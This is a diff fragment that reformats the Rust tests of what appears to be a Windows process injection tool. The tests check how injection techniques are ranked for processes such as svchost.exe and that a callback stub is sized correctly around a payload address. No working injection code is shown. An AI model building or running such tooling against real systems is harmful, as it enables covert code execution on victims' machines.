-            InjectionTechnique::CallbackInjection { .. }
-        ));
-        assert!(has_cb, "CallbackInjection should be in explorer auto-select");
+        let has_cb = techniques
+            .iter()
+            .any(|t| matches!(t, InjectionTechnique::CallbackInjection { .. }));
+        assert!(
+            has_cb,
+            "CallbackInjection should be in explorer auto-select"
+        );
 
         let techniques = auto_select_techniques("notepad.exe");
-        let has_cb = techniques.iter().any(|t| matches!(
-            t,
-            InjectionTechnique::CallbackInjection { .. }
-        ));
+        let has_cb = techniques
+            .iter()
+            .any(|t| matches!(t, InjectionTechnique::CallbackInjection { .. }));
         assert!(has_cb, "CallbackInjection should be in notepad auto-select");
     }
 
@@ -10661,8 +10652,14 @@ mod tests {
 
         // CertEnumSystemStore (weight 30/200 = 15%) should appear more than
         // CreateTimerQueueTimer (weight 3/200 = 1.5%).
-        let cert_count = counts.get("Callback-CertEnumSystemStore").copied().unwrap_or(0);
-        let timer_count = counts.get("Callback-CreateTimerQueueTimer").copied().unwrap_or(0);
+        let cert_count = counts
+            .get("Callback-CertEnumSystemStore")
+            .copied()
+            .unwrap_or(0);
+        let timer_count = counts
+            .get("Callback-CreateTimerQueueTimer")
+            .copied()
+            .unwrap_or(0);
 
         assert!(
             cert_count > timer_count,
@@ -10684,8 +10681,16 @@ mod tests {
         // Verify the universal callback stub is reasonable size and well-formed.
         let stub = build_callback_stub(0x4141_4141_4141_4141);
         // Stub code + 8 bytes for payload address data slot.
-        assert!(stub.len() >= 32, "stub should be at least 32 bytes, got {}", stub.len());
-        assert!(stub.len() <= 64, "stub should be at most 64 bytes, got {}", stub.len());
+        assert!(
+            stub.len() >= 32,
+            "stub should be at least 32 bytes, got {}",
+            stub.len()
+        );
+        assert!(
+            stub.len() <= 64,
+            "stub should be at most 64 bytes, got {}",
+            stub.len()
+        );
 
         // The last 8 bytes should be the payload address.
         let data_start = stub.len() - 8;
@@ -10716,7 +10721,11 @@ mod tests {
 
         // Stubs should have same code but different data.
         let code_len = stub1.len() - 8;
-        assert_eq!(&stub1[..code_len], &stub2[..code_len], "stub code should be identical");
+        assert_eq!(
+            &stub1[..code_len],
+            &stub2[..code_len],
+            "stub code should be identical"
+        );
 
         let addr1 = u64::from_le_bytes(stub1[code_len..].try_into().unwrap());
         let addr2 = u64::from_le_bytes(stub2[code_len..].try_into().unwrap());
@@ -10742,7 +10751,11 @@ mod tests {
 
     #[test]
     fn section_exec_method_serde_roundtrip() {
-        for method in [SectionExecMethod::Apc, SectionExecMethod::Thread, SectionExecMethod::Callback] {
+        for method in [
+            SectionExecMethod::Apc,
+            SectionExecMethod::Thread,
+            SectionExecMethod::Callback,
+        ] {
             let json = serde_json::to_string(&method).unwrap();
             let method2: SectionExecMethod = serde_json::from_str(&json).unwrap();
             assert_eq!(method, method2, "serde roundtrip failed for {:?}", method);
@@ -10798,36 +10811,38 @@ mod tests {
         // Verify SectionMapping appears in auto-select results for various targets.
         for target in &["svchost.exe", "explorer.exe", "notepad.exe", "termsvc.exe"] {
             let techniques = auto_select_techniques(target);
-            let has_sm = techniques.iter().any(|t| matches!(
-                t,
-                InjectionTechnique::SectionMapping { .. }
-            ));
-            assert!(
-                has_sm,
-                "SectionMapping should be in {} auto-select",
-                target
-            );
+            let has_sm = techniques
+                .iter()
+                .any(|t| matches!(t, InjectionTechnique::SectionMapping { .. }));
+            assert!(has_sm, "SectionMapping should be in {} auto-select", target);
 
             // SectionMapping should be ranked after ContextOnly but before CallbackInjection.
-            let sm_idx = techniques.iter().position(|t| matches!(
-                t,
-                InjectionTechnique::SectionMapping { .. }
-            )).unwrap();
-            let ctx_idx = techniques.iter().position(|t| *t == InjectionTechnique::ContextOnly).unwrap();
-            let cb_idx = techniques.iter().position(|t| matches!(
-                t,
-                InjectionTechnique::CallbackInjection { .. }
-            )).unwrap();
+            let sm_idx = techniques
+                .iter()
+                .position(|t| matches!(t, InjectionTechnique::SectionMapping { .. }))
+                .unwrap();
+            let ctx_idx = techniques
+                .iter()
+                .position(|t| *t == InjectionTechnique::ContextOnly)
+                .unwrap();
+            let cb_idx = techniques
+                .iter()
+                .position(|t| matches!(t, InjectionTechnique::CallbackInjection { .. }))
+                .unwrap();
 
             assert!(
                 sm_idx > ctx_idx,
                 "SectionMapping (idx {}) should be after ContextOnly (idx {}) for {}",
-                sm_idx, ctx_idx, target,
+                sm_idx,
+                ctx_idx,
+                target,
             );
             assert!(
                 sm_idx < cb_idx,
                 "SectionMapping (idx {}) should be before CallbackInjection (idx {}) for {}",
-                sm_idx, cb_idx, target,
+                sm_idx,
+                cb_idx,
+                target,
             );
         }
     }
@@ -10836,11 +10851,23 @@ mod tests {
     fn section_mapping_ranking_order() {
         // Verify the full ranking: WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
         let techniques = auto_select_techniques("svchost.exe");
-        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            techniques[0],
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
         assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
-        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
-        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
-        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
+        assert!(matches!(
+            techniques[2],
+            InjectionTechnique::SectionMapping { .. }
+        ));
+        assert!(matches!(
+            techniques[3],
+            InjectionTechnique::NtSetInfoProcess { .. }
+        ));
+        assert!(matches!(
+            techniques[4],
+            InjectionTechnique::CallbackInjection { .. }
+        ));
     }
 
     #[test]
@@ -10901,10 +10928,9 @@ mod tests {
         // Verify NtSetInfoProcess appears in auto-select results for various targets.
         for target in &["svchost.exe", "explorer.exe", "notepad.exe", "termsvc.exe"] {
             let techniques = auto_select_techniques(target);
-            let has_nsip = techniques.iter().any(|t| matches!(
-                t,
-                InjectionTechnique::NtSetInfoProcess { .. }
-            ));
+            let has_nsip = techniques
+                .iter()
+                .any(|t| matches!(t, InjectionTechnique::NtSetInfoProcess { .. }));
             assert!(
                 has_nsip,
                 "NtSetInfoProcess should be in {} auto-select",
@@ -10912,28 +10938,32 @@ mod tests {
             );
 
             // NtSetInfoProcess should be ranked after SectionMapping but before CallbackInjection.
-            let nsip_idx = techniques.iter().position(|t| matches!(
-                t,
-                InjectionTechnique::NtSetInfoProcess { .. }
-            )).unwrap();
-            let sm_idx = techniques.iter().position(|t| matches!(
-                t,
-                InjectionTechnique::SectionMapping { .. }
-            )).unwrap();
-            let cb_idx = techniques.iter().position(|t| matches!(
-                t,
-                InjectionTechnique::CallbackInjection { .. }
-            )).unwrap();
+            let nsip_idx = techniques
+                .iter()
+                .position(|t| matches!(t, InjectionTechnique::NtSetInfoProcess { .. }))
+                .unwrap();
+            let sm_idx = techniques
+                .iter()
+                .position(|t| matches!(t, InjectionTechnique::SectionMapping { .. }))
+                .unwrap();
+            let cb_idx = techniques
+                .iter()
+                .position(|t| matches!(t, InjectionTechnique::CallbackInjection { .. }))
+                .unwrap();
 
             assert!(
                 nsip_idx > sm_idx,
                 "NtSetInfoProcess (idx {}) should be after SectionMapping (idx {}) for {}",
-                nsip_idx, sm_idx, target,
+                nsip_idx,
+                sm_idx,
+                target,
             );
             assert!(
                 nsip_idx < cb_idx,
                 "NtSetInfoProcess (idx {}) should be before CallbackInjection (idx {}) for {}",
-                nsip_idx, cb_idx, target,
+                nsip_idx,
+                cb_idx,
+                target,
             );
         }
     }
@@ -10942,11 +10972,23 @@ mod tests {
     fn ntsetinfo_ranking_order() {
         // Verify the full ranking: WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
         let techniques = auto_select_techniques("svchost.exe");
-        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
+        assert!(matches!(
+            techniques[0],
+            InjectionTechnique::WaitingThreadHijack { .. }
+        ));
         assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
-        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
-        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
-        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
+        assert!(matches!(
+            techniques[2],
+            InjectionTechnique::SectionMapping { .. }
+        ));
+        assert!(matches!(
+            techniques[3],
+            InjectionTechnique::NtSetInfoProcess { .. }
+        ));
+        assert!(matches!(
+            techniques[4],
+            InjectionTechnique::CallbackInjection { .. }
+        ));
     }
 
     #[test]
